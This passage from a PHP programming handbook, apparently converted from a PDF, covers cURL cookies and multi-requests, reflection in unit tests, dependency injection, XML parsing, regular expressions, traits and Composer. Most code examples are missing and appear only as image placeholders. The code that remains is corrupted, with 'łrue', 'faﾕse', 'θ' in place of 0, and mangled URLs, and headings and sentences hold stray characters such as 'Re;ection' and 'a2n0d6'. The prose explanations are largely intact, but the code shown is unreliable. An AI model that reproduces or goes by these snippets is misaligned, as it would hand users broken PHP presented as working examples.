In cases where you are required to keep cookies after the cURL handle is destroyed, you can specify the file to store them in:

![](image_rsrcMEC.jpg)

Then, when you want to use them again, pass them as the cookie file:

![](image_rsrcMED.jpg)

Remember, though, that these two steps are not necessary unless you need to carry cookies between different cURL handles. For most use cases, setting CURLOPT\_COOKIEFILE to the empty string is all you need.

Cookie handling can be used, for example, to retrieve resources from a web site that requires a login. This is typically a two-step procedure. First, POST to the login page.

![](image_rsrcMEE.jpg)

The second step (after standard error checking is done) is usually a simple GET request. The important thing is to reuse the existing cURL handle for the second request. This ensures the cookies from the first response will be automatically included in the second request.

![](image_rsrcMEF.jpg)

This is only intended as an example of cookie handling. In real life, things are usually more complicated. Often you must perform an initial GET of the login page to pull a login token that needs to be included in your POST. Other sites might block the cURL client based on its User-Agent string, requiring you to change it.

Section 33.4: Using multi\_curl to make multiple POST requests

Sometimes we need to make a lot of POST requests to one or many different endpoints. To deal with this scenario, we can use multi\_curl.

First of all, we create how many requests as needed exactly in the same way of the simple example and put them in an array.

![](image_rsrcMEG.jpg)

We use the curl\_multi\_init and add each handle to it. In this example, we are using 2 different endpoints:

![](image_rsrcMEH.jpg)

Then, we use curl\_multi\_exec to send the requests

![](image_rsrcMEJ.jpg)

![](image_rsrcMEK.jpg)A possible return for this example could be:

The request to 'http://www.example.com' returned 'fruits' in 2 seconds.

The request to 'http://www.example2.com' returned 'seafood' in 5 seconds.

Section 33.5: Sending multi-dimensional data and multiple files with CurlFile in one request

Let's say we have a form like the one below. We want to send the data to our webserver via AJAX and from there to a script running on an external server.

204

![](image_rsrcMEM.jpg)![](image_rsrcMEN.jpg)

So we have normal inputs, a multi-select field and a file dropzone where we can upload multiple files. Assuming the AJAX POST request was successful we get the following data on PHP site:

and the files should look like this

![](image_rsrcMEP.jpg)

![](image_rsrcMER.jpg)![](image_rsrcMES.jpg)

So far, so good. Now we want to send this data and files to the external server using cURL with the CurlFile Class Since cURL only accepts a simple but not a multi-dimensional array, we have to flatten the $\_POST array first. To do this, you could use this function for example which gives you the following:

The next step is to create CurlFile Objects for the uploaded files. This is done by the following loop:

![](image_rsrcMET.jpg)

curl\_file\_create is a helper function of the CurlFile Class a2n0d6creates the CurlFile objects. We save each object in the

$files array with keys named "upload\[0\]" and "upload\[1\]" for our two files.

We now have to combine the flattened post array and the files array and save it as $data like this:

![](image_rsrcMEU.jpg)

The last step is to send the cURL request:

![](image_rsrcMEV.jpg)

Since $data is now a simple (flat) array, cURL automatically sends this POST request with Content Type: multipart/form-data

In upload.php on the external server you can now get the post data and files with $\_POST and $\_FILES as you would normally do.

Section 33.6: Creating and sending a request with a custom method

By default, PHP Curl supports GET and POST requests. It is possible to also send custom requests, such as DELETE, PUT or PATCH (or even non-standard methods) using the CURLOPT\_CUSTOMREQUEST parameter.

![](image_rsrcMEW.jpg)

Section 33.7: Get and Set custom http headers in php

Sending The Request Header

![](image_rsrcMEX.jpg)

Reading the custom header

![](image_rsrcMEY.jpg)

Output:

![](image_rsrcMEZ.jpg)

We can also send the header using below syntax:

![](image_rsrcMF0.jpg)

208

Chapter 34: Re;ection

Section 34.1: Feature detection of classes or objects

Feature detection of classes can partly be done with the property\_exists and method\_exists functions.

![](image_rsrcMF1.jpg)class MyClass {

public $public\_field; protected $protected\_field; private $private\_field; static $static\_field; const CONSTANT \= θ;

public function public\_function() {}

protected function protected\_function() {} private function private\_function() {} static function static\_function() {}

}

// check properłies

$check \= property\_exists('MyClass', 'public\_field');​// łrue

$check \= property\_exists('MyClass', 'protected\_field'); // łrue

$check \= property\_exists('MyClass', 'private\_field');​// łrue, as of PHP 5.3.0

$check \= property\_exists('MyClass', 'static\_field');​// łrue

$check \= property\_exists('MyClass', 'other\_field');​// faﾕse

// check mełhods

$check \= method\_exists('MyClass', 'public\_function');​// łrue

$check \= method\_exists('MyClass', 'protected\_function');​// łrue

$check \= method\_exists('MyClass', 'private\_function');​// łrue

$check \= method\_exists('MyClass', 'static\_function');​// łrue

// however...

$check \= property\_exists('MyClass', 'CONSTANT'); // faﾕse

$check \= property\_exists($object, 'CONSTANT');​// faﾕse

With a ReflectionClass, also constants can be detected:

![](image_rsrcMF2.jpg)

Note: for property\_exists and method\_exists, also an object of the class of interest can be provided instead of the class name. Using reflection, the ReflectionObject class should be used instead of ReflectionClass.

Section 34.2: Testing private/protected methods

Sometimes it's useful to test private & protected methods as well as public ones.

![](image_rsrcMF3.jpg)

![](image_rsrcMF4.jpg)

Easiest way to test drive method is using reflection

![](image_rsrcMF5.jpg)

If the method is static you pass null in the place of the class instance

![](image_rsrcMF6.jpg)

![](image_rsrcMF7.jpg)

Section 34.3: Accessing private and protected member variables

Reflection is often used as part of software testing, such as for the runtime creation/instantiation of mock objects. It's also great for inspecting the state of an object at any given point in time. Here's an example of using Reflection in a unit test to verify a protected class member contains the expected value.

Below is a very basic class for a Car. It has a protected member variable that will contain the value representing the color of the car. Because the member variable is protected we cannot access it directly and must use a getter and setter method to retrieve and set its value respectively.

![](image_rsrcMF8.jpg)

To test this many developers will create a Car object, set the car's color using Car::setColor(), retrieve the color using Car::getColor(), and compare that value to the color they set:

![](image_rsrcMF9.jpg)

On the surface this seems okay. After all, all Car::getColor() does is return the value of the protected member variable Car::$color. But this test is flawed in two ways:

1.  It exercises Car::getColor() which is out of the scope of this test

2.  It depends on Car::getColor() which may have a bug itself which can make the test have a false positive or negative

Let's look at why we shouldn't use Car::getColor() in our unit test and should use Reflection instead. Let's say a developer is assigned a task to add "Metallic" to every car color. So they attempt to modify the Car::getColor() to prepend "Metallic" to the car's color:

![](image_rsrcMFA.jpg)

![](image_rsrcMFB.jpg)Do you see the error? The developer used a semi-colon instead of the concatenation operator in an attempt to prepend "Metallic" to the car's color. As a result, whenever Car::getColor() is called, "Metallic " will be returned regardless of what the car's actual color is. As a result our Car::setColor() unit test will fail even though

works perfectly fine and was not affected by this change.

So how do we verify Car::$color contains the value we are setting via Car::setColor()? We can use Refelection to inspect the protected member variable directly. So how do we do that? We can use Refelection to make the protected member variable accessible to our code so it can retrieve the value.

Let's see the code first and then break it down:

![](image_rsrcMFC.jpg)

Here is how we are using Reflection to get the value of Car::$color in the code above:

1.  We create a new ReflectionObject representing our Car object

2.  We get a ReflectionProperty for Car::$color (this "represents" the Car::$color variable)

3.  We make Car::$color accessible

4.  We get the value of Car::$color

As you can see by using Reflection we could get the value of Car::$color without having to call Car::getColor() or any other accessor function which could cause invalid test results. Now our unit test for Car::setColor() is safe and accurate.

Chapter 35: Dependenc6 Injection

Dependency Injection (DI) is a fancy term for "passing things in". All it really means is passing the dependencies of an object via the constructor and / or setters instead of creating them upon object creation inside the object.

Dependency Injection might also refer to Dependency Injection Containers which automate the construction and injection.

Section 35.1: Constructor Injection

Objects will often depend on other objects. Instead of creating the dependency in the constructor, the dependency should be passed into the constructor as a parameter. This ensures there is not tight coupling between the objects, and enables changing the dependency upon class instantiation. This has a number of benefits, including making code easier to read by making the dependencies explicit, as well as making testing simpler since the dependencies can be switched out and mocked more easily.

In the following example, Component will depend on an instance of Logger, but it doesn't create one. It requires one to be passed as argument to the constructor instead.

![](image_rsrcMFD.jpg)

Without dependency injection, the code would probably look similar to:

![](image_rsrcMFE.jpg)

Using new to create new objects in the constructor indicates that dependency injection was not used (or was used incompletely), and that the code is tightly coupled. It is also a sign that the code is incompletely tested or may have brittle tests that make incorrect assumptions about program state.

In the above example, where we are using dependency injection instead, we could easily change to a different Logger if doing so became necessary. For example, we might use a Logger implementation that logs to a different location, or that uses a different logging format, or that logs to the database instead of to a file.

Section 35.2: Setter Injection

Dependencies can also be injected by setters.

![](image_rsrcMFF.jpg)

![](image_rsrcMFG.jpg)

This is especially interesting when the core functionality of the class does not rely on the dependency to work.

Here, the only needed dependency is the DatabaseConnection so it's in the constructor. The Logger dependency is optional and thus does not need to be part of the constructor, making the class easier to use.

Note that when using setter injection, it's better to extend the functionality rather than replacing it. When setting a dependency, there's nothing confirming that the dependency won't change at some point, which could lead in unexpected results. For example, a FileLogger could be set at first, and then a MailLogger could be set. This breaks encapsulation and makes logs hard to find, because we're replacing the dependency.

To prevent this, we should add a dependency with setter injection, like so:

![](image_rsrcMFH.jpg)

![](image_rsrcMFJ.jpg)

Like this, whenever we'll use the core functionality, it won't break even if there is no logger dependency added, and any logger added will be used even though another logger could've been added. We're extending functionality instead of replacing it.

Section 35.3: Container Injection

Dependency Injection (DI) in the context of using a Dependency Injection Container (DIC) can be seen as a superset of constructor injection. A DIC will typically analyze a class constructor's typehints and resolve its needs, effectively injecting the dependencies needed for the instance execution.

The exact implementation goes well beyond the scope of this document but at its very heart, a DIC relies on using the signature of a class...

![](image_rsrcMFK.jpg)

... to automatically instantiate it, relying most of the time on an autoloading system.

![](image_rsrcMFM.jpg)

If you are using PHP in version at least 5.5 and want to get a name of a class in a way that's being shown above, the correct way is the second approach. That way you can quickly find usages of the class using modern IDEs, which will greatly help you with potential refactoring. You do not want to rely on regular strings.

In this case, the Documentation\\Example knows it needs a Meaning, and a DIC would in turn instantiate a Meaning

type. The concrete implementation need not depend on the consuming instance.

Instead, we set rules in the container, prior to object creation, that instructs how specific types should be instantiated if need be.

This has a number of advantages, as a DIC can

![](image_rsrcMFN.jpg)Share common instances

![](image_rsrcMFP.jpg)![](image_rsrcMFR.jpg)Provide a factory to resolve a type signature Resolve an interface signature

If we define rules about how specific type needs to be managed we can achieve fine control over which types are shared, instantiated, or created from a factory.

Chapter 36: XML

Section 36.1: Create a XML using DomDocument

To create a XML using DOMDocument,basically, we need to create all the tags and attributes using the

![](image_rsrcMFS.jpg)createElement() and createAttribute() methods and them create the XML structure with the appendChild(). The example below includes tags, attributes, a CDATA section and a different namespace for the second tag:

$dom \= new DOMDocument('1.θ', 'utf-8');

$dom\->preserveWhiteSpace \= false;

$dom\->formatOutput \= true;

//creałe łhe main łags, wiłhouł vaﾕues

$books \= $dom\->createElement('books');

$book\_1 \= $dom\->createElement('book');

// creałe some łags wiłh vaﾕues

$name\_1 \= $dom\->createElement('name', 'PHP \- An Introduction');

$price\_1 \= $dom\->createElement('price', '$5.95');

$id\_1 \= $dom\->createElement('id', '1');

//creałe and append an ałłribułe

$attr\_1 \= $dom\->createAttribute('version');

$attr\_1\->value \= '1.θ';

//append łhe ałłribułe

$id\_1\->appendChild($attr\_1);

//creałe łhe second łag book wiłh differenł namespace

$namespace \= '[www.example.com/libraryns/1.θ';](http://www.example.com/libraryns/1.Î¸%27%3B)

//incﾕude łhe namespace prefix in łhe books łag

$books\->setAttributeNS('[http://www.w3.org/2θθθ/xmlns/',](http://www.w3.org/2Î¸Î¸Î¸/xmlns/%27) 'xmlns:ns', $namespace);

$book\_2 \= $dom\->createElementNS($namespace,'ns:book');

$name\_2 \= $dom\->createElementNS($namespace, 'ns:name');

//creałe a CDATA secłion (łhał is anołher DOMNode insłance) and puł ił inside łhe name łag

$name\_cdata \= $dom\->createCDATASection('PHP \- Advanced');

$name\_2\->appendChild($name\_cdata);

$price\_2 \= $dom\->createElementNS($namespace, 'ns:price', '$25.θθ');

$id\_2 \= $dom\->createElementNS($namespace, 'ns:id', '2');

//creałe łhe XML słrucłure

$books\->appendChild($book\_1);

$book\_1\->appendChild($name\_1);

$book\_1\->appendChild($price\_1);

$book\_1\->appendChild($id\_1);

$books\->appendChild($book\_2);

$book\_2\->appendChild($name\_2);

$book\_2\->appendChild($price\_2);

$book\_2\->appendChild($id\_2);

$dom\->appendChild($books);

//saveXML() mełhod rełurns łhe XML in a Słring

print\_r ($dom\->saveXML());

This will output the following XML:

![](image_rsrcMFT.jpg)

Section 36.2: Read a XML document with DOMDocument

Similarly to the SimpleXML, you can use DOMDocument to parse XML from a string or from a XML file

1. From a string

![](image_rsrcMFU.jpg)

2. From a file

![](image_rsrcMFV.jpg)![](image_rsrcMFW.jpg)

Example of parsing Considering the following XML:

This is a example code to parse it

![](image_rsrcMFX.jpg)

This will output:

![](image_rsrcKNA.jpg)The title of the book 1 is PHP - An Introduction and it costs $5.95. The title of the book 2 is PHP - Advanced and it costs $25.00.

Section 36.3: Leveraging XML with PHP's SimpleXML Librar6

SimpleXML is a powerful library which converts XML strings to an easy to use PHP object. The following assumes an XML structure as below.

![](image_rsrcMFY.jpg)

Read our data in to SimpleXML

To get started, we need to read our data into SimpleXML. We can do this in 3 different ways. Firstly, we can load our data from a DOM node.

![](image_rsrcMFZ.jpg)

Our next option is to load our data from an XML file.

![](image_rsrcMG0.jpg)

Lastly, we can load our data from a variable.

![](image_rsrcMG1.jpg)

Whether you've picked to load from a DOM Element, from a file or from a string, you are now left with a SimpleXMLElement variable called $xmlElement. Now, we can start to make use of our XML in PHP.

Accessing our SimpleXML Data

The simplest way to access data in our SimpleXMLElement object is to call the properties directly. If we want to access our first bookName, StackOverflow SimpleXML Example, then we can access it as per below.

![](image_rsrcMG2.jpg)

At this point, SimpleXML will assume that because we have not told it explicitly which book we want, that we want the first one. However, if we decide that we do not want the first one, rather that we want Another SimpleXML Example, then we can access it as per below.

![](image_rsrcMG3.jpg)

It is worth noting that using \[θ\] works the same as not using it, so

![](image_rsrcMG4.jpg)

works the same as

![](image_rsrcMG5.jpg)

Looping through our XML

There are many reasons you may wish to loop through XML, such as that you have a number of items, books in our case, that we would like to display on a webpage. For this, we can use a foreach loop or a standard for loop, taking advantage of SimpleXMLElement's count function..

![](image_rsrcMG6.jpg)

or

![](image_rsrcMG7.jpg)

Handling Errors

Now we have come so far, it is important to realise that we are only humans, and will likely encounter an error eventually - especially if we are playing with different XML files all the time. And so, we will want to handle those errors.

Consider we created an XML file. You will notice that while this XML is much alike what we had earlier, the problem with this XML file is that the final closing tag is /doc instead of /document.

![](image_rsrcMG8.jpg)

![](image_rsrcMG9.jpg)

Now, say, we load this into our PHP as $file.

![](image_rsrcMGA.jpg)

We will be greeted with the following

![](image_rsrcMGB.jpg)

However as soon as we fix this problem, we are presented with "Happy Days".

Section 36.4: Create an XML file using XMLWriter

Instantiate a XMLWriter object:

![](image_rsrcMGC.jpg)

Next open the file to which you want to write. For example, to write to /var/www/example.com/xml/output.xml, use:

![](image_rsrcMGD.jpg)

To start the document (create the XML open tag):

![](image_rsrcMGE.jpg)

This will output:

![](image_rsrcMGF.jpg)

Now you can start writing elements:

![](image_rsrcMGG.jpg)

This will generate the XML:

![](image_rsrcMGH.jpg)

If you need something a little more complex than simply nodes with plain values, you can also "start" an element and add attributes to it before closing it:

![](image_rsrcMGJ.jpg)

This will output:

![](image_rsrcMGK.jpg)

Section 36.5: Read a XML document with SimpleXML

You can parse XML from a string or from a XML file

1. From a string

![](image_rsrcMGM.jpg)

2. From a file

![](image_rsrcMGN.jpg)![](image_rsrcMGP.jpg)

Example of parsing Considering the following XML:

![](image_rsrcMGR.jpg)

![](image_rsrcKMR.jpg)This will output:

The title of the book 1 is PHP - An Introduction and it costs $5.95. The title of the book 2 is PHP - Advanced and it costs $25.00.

Chapter 37: SimpleXML

Section 37.1: Loading XML data into simplexml

Loading from string

Use simplexml\_load\_string to create a SimpleXMLElement from a string:

![](image_rsrcMGS.jpg)

Note that or not || must be used here because the precedence of or is higher than \=. The code after or will only be executed if $xml finally resolves to false.

Loading from file

Use simplexml\_load\_file to load XML data from a file or a URL:

![](image_rsrcMGT.jpg)

The URL can be of any schemes that PHP supports, or custom stream wrappers.

Chapter 38: Parsing HTML

Section 38.1: Parsing HTML from a string

PHP implements a DOM Level 2 compliant parser, allowing you to work with HTML using familiar methods like

getElementById() or appendChild().

![](image_rsrcMGU.jpg)

Outputs:

![](image_rsrcMGV.jpg)

Note that PHP will emit warnings about any problems with the HTML, especially if you are importing a document fragment. To avoid these warnings, tell the DOM library (libxml) to handle its own errors by calling libxml\_use\_internal\_errors() before importing your HTML. You can then use libxml\_get\_errors() to handle errors if needed.

Section 38.2: Using XPath

![](image_rsrcMGW.jpg)

Outputs:

![](image_rsrcMGX.jpg)

Section 38.3: SimpleXML

Presentation

![](image_rsrcMGY.jpg)SimpleXML is a PHP library which provides an easy way to work with XML documents (especially reading and iterating through XML data).

![](image_rsrcMGZ.jpg)The only restraint is that the XML document must be well-formed.

Parsing XML using procedural approach

![](image_rsrcMH0.jpg)

![](image_rsrcMH1.jpg)

![](image_rsrcMH2.jpg)Parsing XML using OOP approach

Accessing Children and Attributes

![](image_rsrcMH3.jpg)When SimpleXML parses an XML document, it converts all its XML elements, or nodes, to properties of the resulting SimpleXMLElement object

![](image_rsrcMH4.jpg)In addition, it converts XML attributes to an associative array that may be accessed from the property to which they belong.

![](image_rsrcMH5.jpg)When you know their names:

![](image_rsrcMH6.jpg)The major drawback of this approach is that it is necessary to know the names of every element and attribute in the XML document.

![](image_rsrcMH7.jpg)When you don't know their names (or you don't want to know them):

225

Chapter 39: Regular Expressions (regexp/PCRE)

Parameter​Details

$pattern a string with a regular expression (PCRE pattern)

Section 39.1: Global RegExp match

A global RegExp match can be performed using preg\_match\_all. preg\_match\_all returns all matching results in the subject string (in contrast to preg\_match, which only returns the first one).

The preg\_match\_all function returns the number of matches. Third parameter $matches will contain matches in format controlled by flags that can be given in fourth parameter.

![](image_rsrcMH8.jpg)If given an array, $matches will contain array in similar format you d get with preg\_match, except that preg\_match stops at first match, where preg\_match\_all iterates over the string until the string is wholly consumed and returns result of each iteration in a multidimensional array, which format can be controlled by the flag in fourth argument.

The fourth argument, $flags, controls structure of $matches array. Default mode is PREG\_PATTERN\_ORDER and possible flags are PREG\_SET\_ORDER and PREG\_PATTERN\_ORDER.

Following code demonstrates usage of preg\_match\_all:

![](image_rsrcMH9.jpg)

The first var\_dump from PREG\_SET\_ORDER gives this output:

![](image_rsrcMHA.jpg)

![](image_rsrcMHB.jpg)

$matches has three nested arrays. Each array represents one match, which has the same format as the return result of preg\_match.

The second var\_dump (PREG\_PATTERN\_ORDER) gives this output:

![](image_rsrcMHC.jpg)

When the same regexp is run through preg\_match, following array is returned:

![](image_rsrcMHD.jpg)

Section 39.2: String matching with regular expressions

preg\_match checks whether a string matches the regular expression.

![](image_rsrcMHE.jpg)

If you pass in a third parameter, it will be populated with the matching data of the regular expression:

![](image_rsrcMHF.jpg)

$matches contains an array of the whole match then substrings in the regular expression bounded by parentheses, in the order of open parenthesis's offset. That means, if you have /z(a(b))/ as the regular expression, index 0 contains the whole substring zab, index 1 contains the s2u2bs7tring bounded by the outer parentheses ab and index 2

contains the inner parentheses b.

Section 39.3: Split string into arra6 b6 a regular expression

![](image_rsrcMHG.jpg)

Output:

![](image_rsrcMHH.jpg)

To split a string into a array simply pass the string and a regexp for preg\_split(); to match and search, adding a third parameter (limit) allows you to set the number of "matches" to perform, the remaining string will be added to the end of the array.

The fourth parameter is (flags) here we use the PREG\_SPLIT\_NO\_EMPTY which prevents our array from containing any empty keys / values.

Section 39.4: String replacing with regular expression

![](image_rsrcMHJ.jpg)

Outputs

![](image_rsrcMHK.jpg)

Searches for everything between semicolons and reverses the order.

Section 39.5: String replace with callback

preg\_replace\_callback works by sending every matched capturing group to the defined callback and replaces it with the return value of the callback. This allows us to replace strings based on any kind of logic.

![](image_rsrcMHM.jpg)

![](image_rsrcMHN.jpg)

229

Chapter 40: Traits

Section 40.1: What is a Trait?

PHP only allows single inheritance. In other words, a class can only extend one other class. But what if you need to include something that doesn't belong in the parent class? Prior to PHP 5.4 you would have to get creative, but in

5.4 Traits were introduced. Traits allow you to basically "copy and paste" a portion of a class into your main class

![](image_rsrcMHP.jpg)

So here we have MrEd, which is already extending Horse. But not all horses Talk, so we have a Trait for that. Let's note what this is doing

First, we define our Trait. We can use it with autoloading and Namespaces (see also Referencing a class or function in a namespace). Then we include it into our MrEd class with the keyword use.

You'll note that MrEd takes to using the Talk functions and variables without defining them. Remember what we said about copy and paste? These functions and variables are all defined within the class now, as if this class had defined them.

Traits are most closely related to Abstract classes in that you can define variables and functions. You also cannot instantiate a Trait directly (i.e. new Trait()). Traits cannot force a class to implicitly define a function like an Abstract class or an Interface can. Traits are only for explicit definitions (since you can implement as many Interfaces as you want, see Interfaces).

When should I use a Trait?

![](image_rsrcKH6.jpg)The first thing you should do, when considering a Trait, is to ask yourself this important question

Can I avoid using a Trait by restructuring my code?

More often than not, the answer is going to be Yes. Traits are edge cases caused by single inheritance. The temptation to misuse or overuse Traits can be high. But consider that a Trait introduces another source for your code, which means there's another layer of complexity. In the example here, we're only dealing with 3 classes. But Traits mean you can now be dealing with far more than that. For each Trait, your class becomes that much harder

to deal with, since you must now go reference each Trait to find out what it defines (and potentially where a collision happened, see Conflict Resolution). Ideally, you2s3h0ould keep as few Traits in your code as possible.

Section 40.2: Traits to facilitate horizontal code reuse

Let's say we have an interface for logging:

![](image_rsrcMHR.jpg)

Now say we have two concrete implementations of the Logger interface: the FileLogger and the ConsoleLogger.

![](image_rsrcMHS.jpg)

Now if you define some other class Foo which you also want to be able to perform logging tasks, you could do something like this:

![](image_rsrcMHT.jpg)

Foo is now also a Logger, but its functionality depends on the Logger implementation passed to it via setLogger(). If we now want class Bar to also have this logging mechanism, we would have to duplicate this piece of logic in the Bar class.

Instead of duplicating the code, a trait can be defined:

![](image_rsrcMHU.jpg)

![](image_rsrcMHV.jpg)Now that we have defined the logic in a trait, we can use the trait to add the logic to the Foo and Bar classes:

![](image_rsrcMHW.jpg)

And, for example, we can use the Foo class like this:

![](image_rsrcMHX.jpg)

Section 40.3: Con;ict Resolution

Trying to use several traits into one class could result in issues involving conflicting methods. You need to resolve such conflicts manually.

For example, let's create this hierarchy:

![](image_rsrcMHY.jpg)

Now, let's try to create the following class:

![](image_rsrcMHZ.jpg)

The php interpreter will return a fatal error:

![](image_rsrcMJ0.jpg)Fatal error: Trait method say has not been applied, because there are collisions with other trait methods on TalkingParrot

To resolve this conflict, we could do this:

![](image_rsrcMJ1.jpg)![](image_rsrcMJ2.jpg)use keyword insteadof to use the method from one trait instead of method from another trait create an alias for the method with a construct like WoofTrait::say as sayAsDog;

![](image_rsrcMJ3.jpg)

![](image_rsrcKNA.jpg)This code will produce the following output:

Meow Woof

Section 40.4: Implementing a Singleton using Traits

Disclaimer: In no way does this example advocate the use of singletons. Singletons are to be used with a lot of care.

In PHP there is quite a standard way of implementing a singleton:

![](image_rsrcMJ4.jpg)

To prevent code duplication, it is a good idea to extract this behaviour into a trait.

![](image_rsrcMJ5.jpg)

Now any class that wants to function as a singleton can simply use the trait:

![](image_rsrcMJ6.jpg)

Even though it is now impossible to serialize a singleton, it is still useful to also disallow the deserialize method.

Section 40.5: Traits to keep classes clean

Over time, our classes may implement more and more interfaces. When these interfaces have many methods, the total number of methods in our class will become very large.

For example, let's suppose that we have two interfaces and a class implementing them:

![](image_rsrcMJ7.jpg)

Instead of implementing all the interface methods inside the Article class, we could use separate Traits to implement these interfaces, keeping the class smaller and separating the code of the interface implementation from the class.

From example, to implement the Printable interface we could create this trait:

![](image_rsrcMJ8.jpg)

and make the class use the trait:

![](image_rsrcMJ9.jpg)

The primary benefits would be that our interface-implementation methods will be separated from the rest of the class, and stored in a trait who has the sole responsibility to implement the interface for that particular type of object.

Section 40.6: Multiple Traits Usage

![](image_rsrcMJA.jpg)

The above example will output:

![](image_rsrcMJB.jpg)

Section 40.7: Changing Method Visibilit6

![](image_rsrcMJC.jpg)

![](image_rsrcMJD.jpg)

Running this example:

![](image_rsrcMJE.jpg)

So be aware that in the last example in MyClass2 the original un-aliased method from trait HelloWorld stays accessible as-is.

236

Chapter 41: Composer Dependenc6 Manager

Parameter​Details

license​Defines the type of license you want to use in the Project. authors​Defines the authors of the project, as well as the author details. support              Defines the support emails, irc channel, and various links. require              Defines the actual dependencies as well as the package versions. require-dev Defines the packages necessary for developing the project.

suggest​Defines the package suggestions, i.e. packages which can help if installed. autoload​Defines the autoloading policies of the project.

autoload-dev Defines the autoloading policies for developing the project.

Composer is PHP's most commonly used dependency manager. It's analogous to npm in Node, pip for Python, or

NuGet for .NET.

Section 41.1: What is Composer?

Composer is a dependency/package manager for PHP. It can be used to install, keep track of, and update your project dependencies. Composer also takes care of autoloading the dependencies that your application relies on, letting you easily use the dependency inside your project without worrying about including them at the top of any given file.

Dependencies for your project are listed within a composer.json file which is typically located in your project root. This file holds information about the required versions of packages for production and also development.

A full outline of the composer.json schema can be found on the Composer Website.

This file can be edited manually using any text-editor or automatically through the command line via commands such as composer require <package\> or composer require\-dev <package\>.

To start using composer in your project, you will need to create the composer.json file. You can either create it manually or simply run composer init. After you run composer init in your terminal, it will ask you for some basic information about your project: Package name (vendor/package \- e.g. laravel/laravel), Description - optional, Author and some other information like Minimum Stability, License and Required Packages.

The require key in your composer.json file specifies Composer which packages your project depends on. require

takes an object that maps package names (e.g. monolog/monolog) to version constraints (e.g. 1.0.\*).

![](image_rsrcMJF.jpg)

To install the defined dependencies, you will need to run the composer install command and it will then find the defined packages that matches the supplied version constraint and download it into the vendor directory. It's a convention to put third party code into a directory named vendor.

You will notice the install command also created a composer.lock file.

A composer.lock file is automatically generated by Comp2o3se7r. This file is used to track the currently installed

versions and state of your dependencies. Running composer install will install packages to exactly the state stored in the lock file.

Section 41.2: Autoloading with Composer

While composer provides a system to manage dependencies for PHP projects (e.g. from Packagist), it can also notably serve as an autoloader, specifying where to look for specific namespaces or include generic function files.

It starts with the composer.json file:

![](image_rsrcMJG.jpg)

This configuration code ensures that all classes in the namespace MyVendorName\\MyProject are mapped to the src directory and all classes in MyVendorName\\MyProject\\Tests to the tests directory (relative to your root directory). It will also automatically include the file functions.php.

After putting this in your composer.json file, run composer update in a terminal to have composer update the dependencies, the lock file and generate the autoload.php file. When deploying to a production environment you would use composer install \--no\-dev. The autoload.php file can be found in the vendor directory which should be generated in the directory where composer.json resides.

You should require this file early at a setup point in the lifecycle of your application using a line similar to that below.

![](image_rsrcMJH.jpg)

Once included, the autoload.php file takes care of loading all the dependencies that you provided in your

composer.json file.

Some examples of the class path to directory mapping:

![](image_rsrcMJJ.jpg)![](image_rsrcMJK.jpg)![](image_rsrcMJM.jpg)![](image_rsrcMJN.jpg)MyVendorName\\MyProject\\Shapes\\Square​src/Shapes/Square.php. MyVendorName\\MyProject\\Tests\\Shapes\\Square              tests/Shapes/Square.php.

Section 41.3: Difference between 'composer install' and 'composer update'

composer update

composer update will update our dependencies as they are specified in composer.json.

238

For example, if our project uses this configuration:

![](image_rsrcMJP.jpg)

Supposing we have actually installed the 2.θ.1 version of the package, running composer update will cause an upgrade of this package (for example to 2.θ.2, if it has already been released).

![](image_rsrcMJR.jpg)

In detail​will:

![](image_rsrcMJS.jpg)Read

![](image_rsrcMJT.jpg)![](image_rsrcMJU.jpg)![](image_rsrcMJV.jpg)Remove installed packages that are no more required in composer.json Check the availability of the latest versions of our required packages Install the latest versions of our packages

![](image_rsrcMJW.jpg)Update composer.lock to store the installed packages version

composer install

composer install will install all of the dependencies as specified in the composer.lock file at the version specified (locked), without updating anything.

In detail:

![](image_rsrcMJX.jpg)Read composer.lock file

![](image_rsrcMJY.jpg)Install the packages specified in the composer.lock file When to install and when to update

![](image_rsrcMJZ.jpg)composer update is mostly used in the 'development' phase, to upgrade our project packages.

![](image_rsrcMK0.jpg)composer install is primarily used in the 'deploying phase' to install our application on a production server or on a testing environment, using the same dependencies stored in the composer.lock file created by composer update.

Section 41.4: Composer Available Commands

Command​Usage

about​Short information about Composer

archive​Create an archive of this composer package

browse​Opens the package's repository URL or homepage in your browser. clear-cache​Clears composer's internal package cache.

clearcache​Clears composer's internal package cache. config​Set config options

create-project Create new project from a package into given directory. depends​Shows which packages cause the given package to be installed diagnose              Diagnoses the system to identify common errors.

dump-autoload Dumps the autoloader dumpautoload Dumps the autoloader

exec​Execute a vendored binary/script

global​Allows running commands in the global composer dir ($COMPOSER\_HOME). help​Displays help for a command

home​Opens the package's repository URL or 2ho3m9epage in your browser.

info​Show information about packages

init​Creates a basic composer.json file in current directory.

install

Installs the project dependencies from the composer.lock file if present, or falls back on the composer.json.

licenses​Show information about licenses of dependencies list​Lists commands

outdated​Shows a list of installed packages that have updates available, including their latest version. prohibits              Shows which packages prevent the given package from being installed

remove​Removes a package from the require or require-dev

require​Adds required packages to your composer.json and installs them run-script​Run the scripts defined in composer.json.

search​Search for packages

self-update Updates composer.phar to the latest version. selfupdate Updates composer.phar to the latest version. show              Show information about packages

status​Show a list of locally modified packages suggests​Show package suggestions

update

Updates your dependencies to the latest version according to composer.json, and updates the composer.lock file.

validate​Validates a composer.json and composer.lock

why​Shows which packages cause the given package to be installed

why-not​Shows which packages prevent the given package from being installed

Section 41.5: Benefits of Using Composer

Composer tracks which versions of packages you have installed in a file called composer.lock, which is intended to be committed to version control, so that when the project is cloned in the future, simply running composer install will download and install all the project's dependencies.

Composer deals with PHP dependencies on a per-project basis. This makes it easy to have several projects on one machine that depend on separate versions of one PHP package.

Composer tracks which dependencies are only intended for dev environments only

![](image_rsrcMK1.jpg)

Composer provides an autoloader, making it extremely easy to get started with any package. For instance, after installing Goutte with composer require fabpot/goutte, you can immediately start to use Goutte in a new project:

![](image_rsrcMK2.jpg)

Composer allows you to easily update a project to the latest version that is allowed by your composer.json. EG.

composer update fabpot/goutte, or to update each of your project's dependencies: composer update.

Section 41.6: Installation

You may install Composer locally, as part of your project, or globally as a system wide executable. Locally

To install, run these commands in your terminal.

![](image_rsrcMK3.jpg)

This will download composer.phar (a PHP Archive file) to the current directory. Now you can run php composer.phar to use Composer, e.g.

![](image_rsrcMK4.jpg)

Globally

To use Composer globally, place the composer.phar file to a directory that is part of your PATH

![](image_rsrcMK5.jpg)

Now you can use composer anywhere instead of php composer.phar, e.g.

![](image_rsrcMK6.jpg)

Chapter 42: Magic Methods

Section 42.1:   call() and     callStatic()

 call() and  callStatic() are called when somebody is calling nonexistent object method in object or static context.

![](image_rsrcMK7.jpg)

class Foo

{

/\*\*

